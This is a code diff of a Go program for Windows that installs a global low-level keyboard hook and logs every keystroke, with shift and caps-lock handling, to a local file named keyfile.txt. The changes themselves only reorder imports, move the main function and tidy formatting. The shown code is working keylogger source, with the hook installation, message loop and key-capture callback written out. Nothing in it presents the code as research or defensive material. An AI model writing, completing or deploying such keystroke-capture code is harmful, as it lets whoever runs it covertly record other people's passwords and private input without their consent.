@@ -2,11 +2,11 @@ package main
 
 import (
 	"fmt"
+	"log"
 	"os"
 	"syscall"
 	"time"
 	"unsafe"
-	"log"
 
 	"golang.org/x/sys/windows"
 )
@@ -119,22 +119,6 @@ type MSG struct {
 }
 
 var file *os.File
-var shiftPressed bool
-var capsLockOn bool
-
-func main() {
-	file, _ = os.Create("keyfile.txt")
-	hInstance, _, _ := kernel32.NewProc("GetModuleHandleW").Call(0)
-	hook = SetWindowsHookEx(WH_KEYBOARD_LL, syscall.NewCallback(LowLevelKeyboardProc), hInstance, 0)
-
-	var msg MSG
-	for {
-		r, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
-		if r == 0 {
-			break
-		}
-	}
-}
 
 func SetWindowsHookEx(idHook int, lpfn uintptr, hmod uintptr, dwThreadId uint32) HHOOK {
 	ret, _, _ := procSetWindowsHookExW.Call(uintptr(idHook), lpfn, hmod, uintptr(dwThreadId))
@@ -153,7 +137,7 @@ func LowLevelKeyboardProc(nCode int, wParam WPARAM, lParam LPARAM) LRESULT {
 			vkCode := kbdStruct.VkCode
 
 			// Check for shift and caps lock states
-			shiftPressed := (getKeyState(160) & 0x8000) != 0 || (getKeyState(161) & 0x8000) != 0
+			shiftPressed := (getKeyState(160)&0x8000) != 0 || (getKeyState(161)&0x8000) != 0
 			capsLockOn := (getKeyState(20) & 0x0001) != 0
 
 			value, exists := asciiMap[int(vkCode)]
@@ -234,4 +218,18 @@ func transform(s string, shift bool) string {
 func UnhookWindowsHookEx(hhk HHOOK) bool {
 	ret, _, _ := procUnhookWindowsHookEx.Call(uintptr(hhk))
 	return ret != 0
+}
+
+func main() {
+	file, _ = os.Create("keyfile.txt")
+	hInstance, _, _ := kernel32.NewProc("GetModuleHandleW").Call(0)
+	hook = SetWindowsHookEx(WH_KEYBOARD_LL, syscall.NewCallback(LowLevelKeyboardProc), hInstance, 0)
+
+	var msg MSG
+	for {
+		r, _, _ := procGetMessageW.Call(uintptr(unsafe.Pointer(&msg)), 0, 0, 0)
+		if r == 0 {
+			break
+		}
+	}
 }
